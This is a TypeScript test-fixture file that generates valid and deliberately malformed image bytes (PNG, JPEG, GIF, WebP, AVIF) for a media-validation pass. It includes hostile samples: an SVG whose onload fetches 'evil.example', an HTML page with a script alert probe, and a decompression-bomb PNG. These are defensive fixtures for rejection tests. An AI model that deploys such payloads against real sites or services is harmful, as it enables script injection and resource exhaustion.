import { deflateSync } from 'node:zlib';
/**
 * Deterministic image bytes for the article-media tests.
 *
 * Admission is a real validation pass — a PNG is inflated and checked scanline
 * by scanline, a JPEG is walked segment by segment to `EOI` — so the fixtures
 * for accepted formats are genuinely decodable images built here in code rather
 * than headers or checked-in binaries. The hostile fixtures are the interesting
 * half: a header with nothing behind it, a header that lies about the size of
 * the raster that follows, an animation, and containers whose payload this
 * process cannot verify at all.
 *
 * Nothing here is fetched from a network, and no fixture is a copy of a real
 * publisher's artwork.
 */

const CRC_TABLE = ((): Uint32Array => {
  const table = new Uint32Array(256);
  for (let index = 0; index < 256; index += 1) {
    let value = index;
    for (let bit = 0; bit < 8; bit += 1) {
      value = (value & 1) === 1 ? 0xedb88320 ^ (value >>> 1) : value >>> 1;
    }
    table[index] = value >>> 0;
  }
  return table;
})();

function crc32(bytes: Buffer): number {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc = (CRC_TABLE[(crc ^ byte) & 0xff] ?? 0) ^ (crc >>> 8);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function pngChunk(type: string, data: Buffer): Buffer {
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.byteLength);
  const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
  const checksum = Buffer.alloc(4);
  checksum.writeUInt32BE(crc32(body));
  return Buffer.concat([length, body, checksum]);
}

const PNG_SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function ihdr(width: number, height: number, colourType = 2, bitDepth = 8): Buffer {
  const data = Buffer.alloc(13);
  data.writeUInt32BE(width, 0);
  data.writeUInt32BE(height, 4);
  data[8] = bitDepth;
  data[9] = colourType;
  return pngChunk('IHDR', data);
}

type Rgb = readonly [number, number, number];

function rawScanlines(width: number, height: number, colour: Rgb): Buffer {
  const stride = width * 3;
  const raw = Buffer.alloc((stride + 1) * height);
  for (let row = 0; row < height; row += 1) {
    const start = row * (stride + 1);
    raw[start] = 0; // no filter
    for (let column = 0; column < width; column += 1) {
      const pixel = start + 1 + column * 3;
      raw[pixel] = colour[0];
      raw[pixel + 1] = colour[1];
      raw[pixel + 2] = colour[2];
    }
  }
  return raw;
}

/**
 * A real, decodable PNG of a solid colour.
 *
 * The colour is part of the identity of the fixture: two images that differ
 * only by colour hash differently, which is what the deduplication and
 * upgrade-in-place tests need.
 */
export function makePng(width: number, height: number, colour: Rgb = [32, 96, 192]): Buffer {
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height),
    pngChunk('IDAT', deflateSync(rawScanlines(width, height, colour), { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * A PNG whose `IHDR` declares one size while its pixel data is another.
 *
 * This is the shape a header-trusting validator gets fooled by: the declared
 * dimensions are small and harmless, and the raster behind them is not the one
 * described. Only inflating the image data can tell the difference.
 */
export function makeMismatchedPng(width: number, height: number, actualHeight: number): Buffer {
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height),
    pngChunk('IDAT', deflateSync(rawScanlines(width, actualHeight, [10, 20, 30]), { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A PNG header declaring a size, with no pixel data behind it. */
export function makePngHeader(width: number, height: number): Buffer {
  return Buffer.concat([PNG_SIGNATURE, ihdr(width, height)]);
}

/** A complete PNG with one image data byte flipped, so its checksum fails. */
export function makeCorruptedPng(width: number, height: number): Buffer {
  const png = makePng(width, height);
  const corrupted = Buffer.from(png);
  // Well inside the compressed image data, past every chunk header.
  const target = png.byteLength - 20;
  corrupted[target] = (corrupted[target] ?? 0) ^ 0xff;
  return corrupted;
}

/** A complete PNG with its trailing `IEND` chunk cut off. */
export function makeTruncatedPng(width: number, height: number): Buffer {
  const png = makePng(width, height);
  return png.subarray(0, png.byteLength - 12);
}

/**
 * An animated PNG: a real first frame plus the `acTL` control chunk.
 *
 * Archiving this as a still would silently drop every frame after the first, so
 * admission has to refuse the file rather than accept the part it understands.
 */
export function makeAnimatedPng(width: number, height: number): Buffer {
  const control = Buffer.alloc(8);
  control.writeUInt32BE(2, 0); // frames
  control.writeUInt32BE(0, 4); // loop forever
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height),
    pngChunk('acTL', control),
    pngChunk('IDAT', deflateSync(rawScanlines(width, height, [64, 64, 64]), { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Malformed "interlaced" PNG: the IHDR claims Adam7 interlacing but the scan
 * data behind it is ordinary sequential rows, so no real Adam7 pass structure
 * exists and a decoder must refuse it. Genuine Adam7 bytes are covered by the
 * encoder-generated `interlacedPng` fixture.
 */
export function makeMalformedInterlacedPng(width: number, height: number): Buffer {
  const data = Buffer.alloc(13);
  data.writeUInt32BE(width, 0);
  data.writeUInt32BE(height, 4);
  data[8] = 8;
  data[9] = 2;
  data[12] = 1; // Adam7
  return Buffer.concat([
    PNG_SIGNATURE,
    pngChunk('IHDR', data),
    pngChunk('IDAT', deflateSync(rawScanlines(width, height, [1, 2, 3]), { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Writes entropy-coded bits with the byte stuffing JPEG requires.
 *
 * A `0xFF` byte inside compressed data is followed by `0x00` so it cannot be
 * mistaken for a marker, and the final partial byte is padded with ones.
 */
class JpegBitWriter {
  private readonly out: number[] = [];
  private current = 0;
  private filled = 0;

  write(code: number, length: number): void {
    for (let bit = length - 1; bit >= 0; bit -= 1) {
      this.writeBit((code >>> bit) & 1);
    }
  }

  finish(): Buffer {
    while (this.filled !== 0) this.writeBit(1);
    return Buffer.from(this.out);
  }

  private writeBit(bit: number): void {
    this.current = ((this.current << 1) | bit) & 0xff;
    this.filled += 1;
    if (this.filled < 8) return;
    this.out.push(this.current);
    if (this.current === 0xff) this.out.push(0x00);
    this.current = 0;
    this.filled = 0;
  }
}

function jpegSegment(marker: number, payload: Buffer): Buffer {
  const head = Buffer.alloc(4);
  head.writeUInt16BE(0xff00 | marker, 0);
  head.writeUInt16BE(payload.byteLength + 2, 2);
  return Buffer.concat([head, payload]);
}

/** A two-symbol Huffman table: the used symbol on `0`, a filler on `10`. */
function jpegHuffmanTable(target: number, symbol: number, filler: number): Buffer {
  const payload = Buffer.alloc(19);
  payload[0] = target;
  payload[1] = 1; // one code of length 1
  payload[2] = 1; // one code of length 2
  payload[17] = symbol;
  payload[18] = filler;
  return jpegSegment(0xc4, payload);
}

function jpegCategory(value: number): number {
  let bits = 0;
  let magnitude = Math.abs(value);
  while (magnitude > 0) {
    bits += 1;
    magnitude >>>= 1;
  }
  return bits;
}

/**
 * A real, decodable baseline grayscale JPEG of one flat tone.
 *
 * A flat block has no AC energy, so every block is a DC coefficient followed by
 * end-of-block, which is what makes a genuine encoder small enough to keep in a
 * fixture. The quantisation table is all ones and the Huffman tables carry only
 * the two symbols the image uses, so the file is minimal but standard: every
 * segment length, the scan, and the end marker are exactly what a decoder
 * expects to walk.
 */
export function makeJpeg(width: number, height: number, tone = 96): Buffer {
  const quantisation = Buffer.concat([Buffer.from([0x00]), Buffer.alloc(64, 1)]);
  const frame = Buffer.alloc(9);
  frame[0] = 8; // sample precision
  frame.writeUInt16BE(height, 1);
  frame.writeUInt16BE(width, 3);
  frame[5] = 1; // one component: grayscale
  frame[6] = 1; // component id
  frame[7] = 0x11; // no subsampling
  frame[8] = 0; // quantisation table 0
  const scanHeader = Buffer.from([1, 1, 0x00, 0, 63, 0x00]);

  // DC coefficient of a flat 8x8 block, quantised by one.
  const dc = 8 * (Math.max(0, Math.min(255, Math.round(tone))) - 128);
  const category = jpegCategory(dc);
  const bits = new JpegBitWriter();
  const blocks = Math.ceil(width / 8) * Math.ceil(height / 8);
  for (let block = 0; block < blocks; block += 1) {
    // Only the first block carries a difference; the rest repeat it.
    if (block === 0 && category > 0) {
      bits.write(0b10, 2); // the category symbol
      bits.write(dc < 0 ? dc + (1 << category) - 1 : dc, category);
    } else {
      bits.write(0b0, 1); // category zero: no difference
    }
    bits.write(0b0, 1); // end of block
  }

  return Buffer.concat([
    Buffer.from([0xff, 0xd8]),
    jpegSegment(0xdb, quantisation),
    jpegSegment(0xc0, frame),
    jpegHuffmanTable(0x00, 0, category > 0 ? category : 1),
    jpegHuffmanTable(0x10, 0x00, 0x01),
    jpegSegment(0xda, scanHeader),
    bits.finish(),
    Buffer.from([0xff, 0xd9]),
  ]);
}

/** A JPEG start-of-image plus a start-of-frame, with no scan and no end. */
export function makeJpegHeader(width: number, height: number): Buffer {
  const frame = Buffer.alloc(19);
  frame.writeUInt16BE(0xffd8, 0); // SOI
  frame.writeUInt16BE(0xffc0, 2); // SOF0
  frame.writeUInt16BE(11, 4); // segment length
  frame[6] = 8; // sample precision
  frame.writeUInt16BE(height, 7);
  frame.writeUInt16BE(width, 9);
  return frame;
}

/** A complete JPEG with a second image appended after its end marker. */
export function makeMultiPictureJpeg(width: number, height: number): Buffer {
  return Buffer.concat([makeJpeg(width, height, 96), makeJpeg(width, height, 160)]);
}

/** A GIF89a header declaring a size, with no LZW data behind it. */
export function makeGifHeader(width: number, height: number): Buffer {
  const bytes = Buffer.alloc(13);
  bytes.write('GIF89a', 0, 'latin1');
  bytes.writeUInt16LE(width, 6);
  bytes.writeUInt16LE(height, 8);
  return bytes;
}

/** A RIFF/WEBP `VP8X` header declaring a size, with no VP8 data behind it. */
export function makeWebpHeader(width: number, height: number): Buffer {
  const bytes = Buffer.alloc(30);
  bytes.write('RIFF', 0, 'latin1');
  bytes.writeUInt32LE(22, 4);
  bytes.write('WEBP', 8, 'latin1');
  bytes.write('VP8X', 12, 'latin1');
  bytes.writeUInt32LE(10, 16);
  bytes.writeUIntLE(width - 1, 24, 3);
  bytes.writeUIntLE(height - 1, 27, 3);
  return bytes;
}

/**
 * An ISO-BMFF `ftypavif` header with an `ispe` box that declares a size.
 *
 * The declaration is free: nothing in the file has to agree with it, and the
 * AV1 payload that would settle the question cannot be decoded here. It is kept
 * as a fixture precisely to prove the archive refuses the container rather than
 * believing the first size it finds.
 */
export function makeAvifHeader(width: number, height: number): Buffer {
  const head = Buffer.alloc(12);
  head.writeUInt32BE(12, 0);
  head.write('ftyp', 4, 'latin1');
  head.write('avif', 8, 'latin1');
  const ispe = Buffer.alloc(20);
  ispe.writeUInt32BE(20, 0);
  ispe.write('ispe', 4, 'latin1');
  ispe.writeUInt32BE(width, 12);
  ispe.writeUInt32BE(height, 16);
  return Buffer.concat([head, ispe]);
}

/** A scriptable vector document, which the archive must never accept. */
export const SVG_BYTES = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="400" onload="fetch(\'https://evil.example/x\')"><rect width="600" height="400"/></svg>',
  'utf8'
);

/** An HTML error page a server might return under an image content type. */
export const HTML_BYTES = Buffer.from(
  '<!doctype html><html><body><script>alert(1)</script>Not found</body></html>',
  'utf8'
);

/**
 * Adversarial reproduction 1: CRC-valid indexed PNG with an empty PLTE chunk.
 * macOS ImageIO rejects this because indexed color requires a non-empty palette.
 */
export function makeAdversarialEmptyPaletteIndexedPng(width = 64, height = 48): Buffer {
  const raw = Buffer.alloc((width + 1) * height);
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 3, 8),
    pngChunk('PLTE', Buffer.alloc(0)),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Adversarial reproduction 2: 28-byte JPEG with SOF/SOS/EOI but no DQT or DHT tables.
 * macOS ImageIO rejects this because entropy decoding requires quantization and Huffman tables.
 */
export function makeAdversarialMinimalJpeg(): Buffer {
  return Buffer.from([
    0xff, 0xd8, // SOI
    0xff, 0xc0, 0x00, 0x0b, 0x08, 0x00, 0x30, 0x00, 0x40, 0x01, 0x01, 0x11, 0x00, // SOF0: 64x48
    0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00, // SOS
    0x00, // scan data
    0xff, 0xd9, // EOI
  ]);
}

/**
 * Real, decodable indexed PNG with a valid 2-color palette and within-bounds pixel indices.
 */
export function makeIndexedPng(width = 64, height = 48): Buffer {
  const plte = Buffer.from([255, 0, 0, 0, 0, 255]); // red, blue
  const raw = Buffer.alloc((width + 1) * height);
  for (let row = 0; row < height; row += 1) {
    const start = row * (width + 1);
    raw[start] = 0; // filter 0
    for (let col = 0; col < width; col += 1) {
      raw[start + 1 + col] = (row + col) % 2; // alternates index 0 and 1
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 3, 8),
    pngChunk('PLTE', plte),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Real, decodable 8-bit grayscale PNG.
 */
export function makeGrayscalePng(width = 64, height = 48, tone = 128): Buffer {
  const raw = Buffer.alloc((width + 1) * height);
  for (let row = 0; row < height; row += 1) {
    const start = row * (width + 1);
    raw[start] = 0;
    for (let col = 0; col < width; col += 1) {
      raw[start + 1 + col] = tone;
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 0, 8),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Real, decodable 8-bit truecolor with alpha (RGBA) PNG.
 */
export function makeRgbaPng(
  width = 64,
  height = 48,
  colour: readonly [number, number, number, number] = [32, 96, 192, 255]
): Buffer {
  const stride = width * 4;
  const raw = Buffer.alloc((stride + 1) * height);
  for (let row = 0; row < height; row += 1) {
    const start = row * (stride + 1);
    raw[start] = 0;
    for (let col = 0; col < width; col += 1) {
      const pixel = start + 1 + col * 4;
      raw[pixel] = colour[0];
      raw[pixel + 1] = colour[1];
      raw[pixel + 2] = colour[2];
      raw[pixel + 3] = colour[3];
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 6, 8),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Proven regression: approximately 53,689 input bytes that decompress to
 * 12,002,000 raw scanline bytes and re-encode to approximately 12,004,028 bytes.
 * Must be rejected under an 8 MiB allowance.
 */
export function makeInflatingPng(): Buffer {
  const width = 2000;
  const height = 2000;
  const filt = Buffer.alloc(height * (width * 3 + 1));
  for (let y = 0; y < height; y += 1) {
    const rowStart = y * (width * 3 + 1);
    filt[rowStart] = 1; // Filter 1: Sub
    const shift = (y * 7) % 503;
    for (let x = 0; x < width * 3; x += 1) {
      filt[rowStart + 1 + x] = ((x + shift) % 503) & 0xff;
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 2, 8),
    pngChunk('IDAT', deflateSync(filt, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Excessive palettes for supported indexed depths:
 * bitDepth 1: max 2 entries (provide 3)
 * bitDepth 2: max 4 entries (provide 5)
 * bitDepth 4: max 16 entries (provide 17)
 * bitDepth 8: max 256 entries (provide 257)
 */
export function makeIndexedPngWithExcessPalette(bitDepth: 1 | 2 | 4 | 8): Buffer {
  const width = 64;
  const height = 48;
  let entries: number;
  if (bitDepth === 1) entries = 3;
  else if (bitDepth === 2) entries = 5;
  else if (bitDepth === 4) entries = 17;
  else entries = 257;
  const plte = Buffer.alloc(entries * 3);
  for (let i = 0; i < entries; i += 1) {
    plte[i * 3] = (i * 37) & 0xff;
    plte[i * 3 + 1] = (i * 59) & 0xff;
    plte[i * 3 + 2] = (i * 83) & 0xff;
  }
  const scanlineBytes = Math.ceil((width * bitDepth) / 8);
  const raw = Buffer.alloc((scanlineBytes + 1) * height);
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 3, bitDepth),
    pngChunk('PLTE', plte),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Decodable indexed PNG with tRNS transparency chunk.
 */
export function makeIndexedPngWithTrns(
  width = 64,
  height = 48,
  alphas: readonly number[] = [0, 128, 255]
): Buffer {
  const plte = Buffer.from([255, 0, 0, 0, 255, 0, 0, 0, 255]); // red, green, blue
  const trns = Buffer.from(alphas);
  const raw = Buffer.alloc((width + 1) * height);
  for (let y = 0; y < height; y += 1) {
    const start = y * (width + 1);
    raw[start] = 0;
    for (let x = 0; x < width; x += 1) {
      raw[start + 1 + x] = (x + y) % 3;
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 3, 8),
    pngChunk('PLTE', plte),
    pngChunk('tRNS', trns),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Decodable 8-bit grayscale PNG with tRNS transparency chunk.
 */
export function makeGrayscalePngWithTrns(width = 64, height = 48, transparentSample = 128): Buffer {
  const trns = Buffer.alloc(2);
  trns.writeUInt16BE(transparentSample, 0);
  const raw = Buffer.alloc((width + 1) * height);
  for (let y = 0; y < height; y += 1) {
    const start = y * (width + 1);
    raw[start] = 0;
    for (let x = 0; x < width; x += 1) {
      raw[start + 1 + x] = transparentSample;
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 0, 8),
    pngChunk('tRNS', trns),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * Decodable 8-bit truecolour RGB PNG with tRNS transparency chunk.
 */
export function makeTruecolourPngWithTrns(
  width = 64,
  height = 48,
  transparentRgb: Rgb = [32, 96, 192]
): Buffer {
  const trns = Buffer.alloc(6);
  trns.writeUInt16BE(transparentRgb[0], 0);
  trns.writeUInt16BE(transparentRgb[1], 2);
  trns.writeUInt16BE(transparentRgb[2], 4);
  const stride = width * 3;
  const raw = Buffer.alloc((stride + 1) * height);
  for (let y = 0; y < height; y += 1) {
    const start = y * (stride + 1);
    raw[start] = 0;
    for (let x = 0; x < width; x += 1) {
      const p = start + 1 + x * 3;
      raw[p] = transparentRgb[0];
      raw[p + 1] = transparentRgb[1];
      raw[p + 2] = transparentRgb[2];
    }
  }
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 2, 8),
    pngChunk('tRNS', trns),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

/**
 * PNGs with malformed tRNS chunks.
 */
export function makePngWithMalformedTrns(
  type: 'indexed-len' | 'gray-len' | 'rgb-len' | 'rgba-trns'
): Buffer {
  const width = 64;
  const height = 48;
  if (type === 'indexed-len') {
    // Indexed with 2 palette entries but 3 tRNS alphas
    const plte = Buffer.from([255, 0, 0, 0, 255, 0]);
    const trns = Buffer.from([0, 128, 255]);
    const raw = Buffer.alloc((width + 1) * height);
    return Buffer.concat([
      PNG_SIGNATURE,
      ihdr(width, height, 3, 8),
      pngChunk('PLTE', plte),
      pngChunk('tRNS', trns),
      pngChunk('IDAT', deflateSync(raw, { level: 9 })),
      pngChunk('IEND', Buffer.alloc(0)),
    ]);
  }
  if (type === 'gray-len') {
    // Grayscale with 3-byte tRNS (must be 2 bytes)
    const raw = Buffer.alloc((width + 1) * height);
    return Buffer.concat([
      PNG_SIGNATURE,
      ihdr(width, height, 0, 8),
      pngChunk('tRNS', Buffer.from([0, 128, 255])),
      pngChunk('IDAT', deflateSync(raw, { level: 9 })),
      pngChunk('IEND', Buffer.alloc(0)),
    ]);
  }
  if (type === 'rgb-len') {
    // RGB with 4-byte tRNS (must be 6 bytes)
    const raw = Buffer.alloc((width * 3 + 1) * height);
    return Buffer.concat([
      PNG_SIGNATURE,
      ihdr(width, height, 2, 8),
      pngChunk('tRNS', Buffer.from([0, 32, 0, 96])),
      pngChunk('IDAT', deflateSync(raw, { level: 9 })),
      pngChunk('IEND', Buffer.alloc(0)),
    ]);
  }
  // RGBA with tRNS (forbidden)
  const raw = Buffer.alloc((width * 4 + 1) * height);
  return Buffer.concat([
    PNG_SIGNATURE,
    ihdr(width, height, 6, 8),
    pngChunk('tRNS', Buffer.from([0, 128])),
    pngChunk('IDAT', deflateSync(raw, { level: 9 })),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}
